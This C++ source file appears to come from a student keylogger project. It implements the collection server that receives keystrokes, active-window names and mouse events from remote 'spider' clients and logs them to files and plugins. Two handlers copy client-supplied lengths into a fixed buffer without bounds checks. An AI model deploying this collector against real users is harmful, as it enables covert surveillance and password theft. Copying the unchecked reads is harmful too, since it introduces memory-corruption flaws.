//
// Spider.cpp<travaux> for epitech in /home/chapui_s/rendu/
//
// Made by chapui_s
// Login   <chapui_s@epitech.eu>
//
// Started on  Wed Oct 21 09:18:47 2015 chapui_s
// Last update Tue Oct 27 17:24:05 2015 bresci_b bresci_b
//

#include "Spider.hh"
#include "Web.hh"

Spider::Spider(const boost::shared_ptr<ISocketEngine> &socket, Web &web, std::list<boost::shared_ptr<IPlugin>> &listPlugins)
  : _socket(socket),
    _web(web),
    _dumpFile(new DumpFile()),
    _listPlugins(listPlugins)
{
  DEBUG_MSG("Spider created");
  _socket->handleError([this](){dieInDignity();});
}

Spider::~Spider()
{
  DEBUG_MSG("Spider deleted");
}

boost::shared_ptr<ISocketEngine>	&Spider::getSocket()
{
  return (_socket);
}

const std::string	&Spider::getName() const
{
  return (_name);
}

void		Spider::dieInDignity()
{
  _web.deleteSpider(shared_from_this());
}

void		Spider::prepareFirstConnection()
{
  _socket->doHandshake(boost::asio::ssl::stream_base::server, [this]() {
      doFirstConnection();
    });
}

void		Spider::setName(uint16_t size)
{
  for (uint16_t i = 0; i < size; i += 1) {
    if (!isprint(_str[i]))
      _str[i] = '_';
  }
  _name = (size) ? (_str) : ("Unknown");
}

void			Spider::doFirstConnection()
{
  _socket->async_read(_buffer.data(), 4, [this]() {
      uint16_t		sizeName;

      _proto = _buffer.getValue<uint16_t>();

      if (_proto != PROTOCOL_VERSION) {
	std::cerr << "Wrong protocole" << std::endl;
	dieInDignity();
	return ;
      }

      if ((sizeName = _buffer.getValue<uint16_t>()) >= SIZE_STRING) {
	std::cerr << "Wrong string size allowed" << std::endl;
	dieInDignity();
	return ;
      }

      _buffer.reset();
      _socket->async_read(_buffer.data(), sizeName, [this, sizeName]() {
	  std::fill(_str, _str + SIZE_STRING, 0);
      	  _buffer.getValue<char>(_str, sizeName);
	  setName(sizeName);

	  _buffer.reset();
	  _socket->async_read(_buffer.data(), 4, [this]() {

	      try {
		if (_dumpFile)
		  _dumpFile->createFile(_name);
	      }
	      catch (const std::exception &e) {
		std::cerr << e.what() << std::endl;
	      }

	      uint16_t	*reponse = new uint16_t;
	      *reponse = 2 << 8 | 2;
	      _socket->async_write(reponse, 2, [this, reponse]() mutable {
		  delete reponse;
		  boost::asio::spawn(_web.get_ioservice(), [this](boost::asio::yield_context yield) {
		      getTypeInfo(yield);
		    });
		});
	    });
      	});
    });
}

void			Spider::getTypeInfo(boost::asio::yield_context yield)
{
  for (;;) {
    uint8_t		id = 0;

    _buffer.reset();
    if (_socket->async_read(_buffer.data(), 1, yield)) {
      dieInDignity();
      return ;
    }

    id = _buffer.getValue<uint8_t>();
    switch (id)
    {
    case (Paquet::KEYSTROKES):
      getKeystrokes(yield);
      break ;

    case (Paquet::MOUSE):
      getMouse(yield);
      break ;

    case (Paquet::COMMAND_CLIENT):
      getClientCMD(yield);
      break ;

    default:
      std::cerr << "Wrong data with spider " << _name << std::endl;
      return ;
    }
  }
}

void			Spider::getKeystrokes(boost::asio::yield_context &yield)
{
  uint16_t		sizeActive = 0;
  uint16_t		sizeText = 0;
  PaquetKeys		paquet;

  if (_socket->async_read(_buffer.data(), 8, yield)) {
    return ;
  }
  _buffer.reset();
  paquet.setDate(_buffer.getValue<uint32_t>());
  paquet.setPid(_buffer.getValue<uint16_t>());
  if ((sizeActive = _buffer.getValue<uint16_t>()) >= SIZE_STRING) {
    DEBUG_MSG("Wrong string size allowed");
    return ;
  }

  _buffer.reset();
  if (_socket->async_read(_buffer.data(), sizeActive, yield)) {
    return ;
  }

  if (sizeActive) {
    std::fill(_str, _str + SIZE_STRING, 0);
    _buffer.getValue<char>(_str, sizeActive);
    paquet.setActive(_str);
  }

  _buffer.reset();
  if (_socket->async_read(_buffer.data(), 2, yield)) {
    return ;
  }
  if ((sizeText = _buffer.getValue<uint16_t>()) >= SIZE_STRING) {
    DEBUG_MSG("Wrong string size allowed");
    return ;
  }

  _buffer.reset();
  if (_socket->async_read(_buffer.data(), sizeText, yield)) {
    return ;
  }

  uint16_t	reponse = 3 << 8 | 2;
  if (_socket->async_write(&reponse, 2, yield)) {
    return ;
  }

  std::fill(_str, _str + SIZE_STRING, 0);
  _buffer.getValue<char>(_str, sizeText);

  paquet.setText(_str);
  paquet.createPaquet();

#ifdef DEBUG
  std::cerr << paquet << std::endl;
#endif // !DEBUG

  try {
    if (_dumpFile)
      _dumpFile->writePaquet(&paquet);
    for (auto plugin : _listPlugins) {
      plugin->getKey(&paquet, _name);
    }
  }
  catch (const std::exception &e) {
    std::cerr << e.what() << std::endl;
  }
}

void			Spider::getMouse(boost::asio::yield_context &yield)
{
  uint16_t		sizeActive = 0;
  PaquetMouse		paquet;

  if (_socket->async_read(_buffer.data(), 8, yield)) {
    return ;
  }

  _buffer.reset();
  paquet.setDate(_buffer.getValue<uint32_t>());
  paquet.setPid(_buffer.getValue<uint16_t>());
  sizeActive = _buffer.getValue<uint16_t>();

  _buffer.reset();
  if (_socket->async_read(_buffer.data(), sizeActive, yield)) {
    return ;
  }

  std::fill(_str, _str + SIZE_STRING, 0);
  _buffer.getValue<char>(_str, sizeActive);
  paquet.setActive(_str);

  _buffer.reset();
  if (_socket->async_read(_buffer.data(), 5, yield)) {
    return ;
  }

  uint16_t	reponse = 3 << 8 | 2;
  if (_socket->async_write(&reponse, 2, yield)) {
    return ;
  }

  paquet.setX(_buffer.getValue<uint16_t>());
  paquet.setY(_buffer.getValue<uint16_t>());
  paquet.setButton(_buffer.getValue<uint8_t>());
  paquet.createPaquet();

#ifdef DEBUG
  std::cerr << paquet << std::endl;
#endif // !DEBUG

  try {
    for (auto plugin : _listPlugins) {
      plugin->getMouse(&paquet, _name);
    }
  }
  catch (const std::exception &e) {
    std::cerr << e.what() << std::endl;
  }
}


void			Spider::getClientCMD(boost::asio::yield_context &yield)
{
  uint16_t		sizeData = 0;
  PaquetCommandClient	paquet;

  if (_socket->async_read(_buffer.data(), 3, yield)) {
    return ;
  }

  _buffer.reset();
  paquet.setOk(_buffer.getValue<uint8_t>());
  sizeData = _buffer.getValue<uint16_t>();

  _buffer.reset();
  if (_socket->async_read(_buffer.data(), sizeData, yield)) {
    return ;
  }

  std::fill(_str, _str + SIZE_STRING, 0);
  _buffer.getValue<char>(_str, sizeData);
  paquet.setDataReponse(_str);
  paquet.createPaquet();

#ifdef DEBUG
      std::cerr << paquet << std::endl;
#endif // !DEBUG

}
